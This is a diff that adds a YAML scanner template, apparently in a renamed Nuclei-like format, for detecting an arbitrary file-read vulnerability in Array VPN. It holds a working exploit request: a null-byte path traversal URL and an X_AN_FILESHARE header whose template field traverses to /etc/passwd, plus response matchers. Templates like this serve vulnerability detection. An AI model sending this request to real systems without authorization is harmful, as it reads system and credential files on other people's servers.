@@ -1,0 +1,28 @@
+id: array-vpn-lfi
+brief:
+    title: Array VPN - Arbitrary File Reading Vulnerability
+    by: pussycat0x
+    level: high
+    about: Array VPN Arbitrary File Reading Vulnerability
+    label:
+        - lfi
+        - vpn
+        - arrayvpn
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/prx/000/http/localhost/client_sec/%00../../../addfolder'
+      head:
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
+      signs:
+        - "on": word
+          has:
+            - /prx/001/http/localh
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 401
